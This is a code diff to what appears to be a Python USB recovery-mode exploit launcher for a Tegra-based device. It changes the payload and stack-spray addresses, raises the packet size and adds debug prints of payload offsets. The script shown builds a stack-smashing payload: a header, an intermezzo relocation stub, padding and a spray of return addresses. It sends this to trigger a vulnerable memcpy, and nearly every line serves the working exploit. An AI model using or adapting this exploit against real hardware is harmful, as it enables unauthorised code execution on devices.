@@ -40,15 +40,15 @@ RCM_HEADER_SIZE = 644
 
 # The address where the RCM payload is placed.
 # This is fixed for most device.
-RCM_PAYLOAD_ADDR    = 0x4000f000
+RCM_PAYLOAD_ADDR    = 0x4000F000
 
 # The address where the user payload is expected to begin.
-PAYLOAD_START_ADDR  = 0x4000aE40
+PAYLOAD_START_ADDR  = 0x4000FE40
 
-# Specify the range of addresses where we should inject oct
+# Specify the range of addresses where we should inject our
 # payload address.
-STACK_SPRAY_START   = 0x4000eE40
-STACK_SPRAY_END     = 0x4000f000
+STACK_SPRAY_START   = 0x40013E40
+STACK_SPRAY_END     = 0x40016000
 
 # notes:
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
@@ -516,8 +516,9 @@ class RCMHax:
         """ Writes data to the main RCM protocol endpoint. """
 
         length = len(data)
-        # packet_size = 0x1000
-        packet_size = 512
+        print("txing {} bytes total".format(length))
+        packet_size = 0x1000
+        # packet_size = 512
         length_sent = 0
 
         while length:
@@ -579,6 +580,8 @@ class RCMHax:
         # Determine how much we'd need to transmit to smash the full stack.
         if length is None:
             length = self.STACK_END - self.get_current_buffer_address()
+
+        print("sending status request with length {}".format(length))
 
         return self.backend.trigger_vulnerability(length)
 
@@ -648,6 +651,8 @@ payload += b'\0' * (RCM_HEADER_SIZE - len(payload))
 # We'll use this data to smash the stack when we execute the vulnerable memcpy.
 print("\nSetting ourselves up to smash the stack...")
 
+print("Payload offset of intermezzo: 0x{:08x}".format(len(payload)))
+
 # Include the Intermezzo binary in the command stream. This is our first-stage
 # payload, and it's responsible for relocating the final payload to 0x40010000.
 intermezzo_size = 0
@@ -656,6 +661,7 @@ with open(intermezzo_path, "rb") as f:
     intermezzo_size = len(intermezzo)
     payload        += intermezzo
 
+print("Payload offset of padding before user payload: 0x{:08x}".format(len(payload)))
 
 # Pad the payload till the start of the user payload.
 padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
@@ -667,16 +673,24 @@ target_payload = b''
 with open(payload_path, "rb") as f:
     target_payload = f.read()
 
+print("Payload offset of user payload first part: 0x{:08x}".format(len(payload)))
+
 # Fit a collection of the payload before the stack spray...
 padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
 payload += target_payload[:padding_size]
+
+print("Payload offset of stack spray: 0x{:08x}".format(len(payload)))
 
 # ... insert the stack spray...
 repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
 payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
 
+print("Payload offset user payload second part 0x{:08x}".format(len(payload)))
+
 # ... and follow the stack spray with the remainder of the payload.
 payload += target_payload[padding_size:]
+
+print("Payload offset of remaining RCM padding 0x{:08x}".format(len(payload)))
 
 # Pad the payload to fill a USB request exactly, so we don't send a short
 # packet and break out of the RCM loop.
@@ -684,12 +698,14 @@ payload_length = len(payload)
 padding_size   = 0x1000 - (payload_length % 0x1000)
 payload += (b'\0' * padding_size)
 
+print("Payload offset of end of payload 0x{:08x}".format(len(payload)))
+
 # Check to see if our payload packet will fit inside the RCM high buffer.
 # If it won't, error out.
 if len(payload) > length:
     size_over = len(payload) - length
     print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
-    # sys.exit(errno.EFBIG)
+    sys.exit(errno.EFBIG)
 
 # Send the constructed payload, which contains the command, the stack smashing
 # values, the Intermezzo relocation stub, and the final payload.
